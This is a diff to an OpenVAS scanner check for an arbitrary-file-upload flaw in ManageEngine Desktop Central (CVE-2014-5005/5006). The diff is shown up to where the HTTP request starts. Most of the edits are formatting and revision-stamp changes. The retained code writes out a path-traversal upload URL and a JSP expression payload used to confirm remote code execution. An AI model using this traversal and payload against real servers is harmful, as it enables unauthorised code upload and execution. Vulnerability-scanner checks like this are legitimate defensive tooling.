@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_manageengine_desktopcentral_69494.nasl 13659 2019-02-14 08:34:21Z cfischer $
+# $Id: gb_manageengine_desktopcentral_69494.nasl 13994 2019-03-05 12:23:37Z cfischer $
 #
 # Multiple ManageEngine Products Arbitrary File Upload Vulnerability
 #
@@ -34,9 +34,9 @@ if(description)
   script_cve_id("CVE-2014-5005", "CVE-2014-5006");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_version("$Revision: 13659 $");
+  script_version("$Revision: 13994 $");
   script_name("Multiple ManageEngine Products  Arbitrary File Upload Vulnerability");
-  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
   script_tag(name:"creation_date", value:"2014-09-09 13:20:38 +0200 (Tue, 09 Sep 2014)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
@@ -49,13 +49,18 @@ if(description)
 
   script_tag(name:"impact", value:"An attacker may leverage this issue to upload arbitrary files to the
   affected computer. This can result in arbitrary code execution within the context of the vulnerable application.");
+
   script_tag(name:"vuldetect", value:"Check if it is possible to upload a file.");
-  script_tag(name:"solution", value:"Ask the vendor for an update");
+
+  script_tag(name:"solution", value:"Ask the vendor for an update.");
+
   script_tag(name:"solution_type", value:"VendorFix");
+
   script_tag(name:"summary", value:"Multiple ManageEngine Products are prone to an arbitrary-file-upload
   vulnerability.");
+
   script_tag(name:"affected", value:"ManageEngine Desktop Central versions 7 through 9 build 90054
-  ManageEngine Desktop Central MSP");
+  ManageEngine Desktop Central MSP.");
 
   script_tag(name:"qod_type", value:"remote_app");
 
@@ -67,20 +72,27 @@ include("http_keepalive.inc");
 include("host_details.inc");
 include("misc_func.inc");
 
-if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
-if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
-if( dir == "/" ) dir = "";
+if( ! port = get_app_port( cpe:CPE ) )
+  exit( 0 );
 
-vt_string_lo = get_vt_string( lowercase:TRUE );
-vt_string = get_vt_string();
+if( ! dir = get_app_location( cpe:CPE, port:port ) )
+  exit( 0 );
+
+if( dir == "/" )
+  dir = "";
+
+useragent = http_get_user_agent();
+
+host = http_host_name( port:port );
+vtstrings = get_vt_strings();
+vt_string_lo = vtstrings["lowercase"];
+vt_string = vtstrings["default"];
+
 pat = vt_string + " RCE Test";
 ex = '<%= new String("' + pat + '") %>';
 len = strlen( ex );
 file = vt_string_lo + '_' + rand() + '.jsp';
 url = dir + '/statusUpdate?actionToCall=LFU&customerId=1337&fileName=../../../../../../' + file + '&configDataID=1';
-
-useragent = http_get_user_agent();
-host = http_host_name( port:port );
 
 req = 'POST ' + url + ' HTTP/1.1\r\n' +
       'Host: ' + host + '\r\n' +
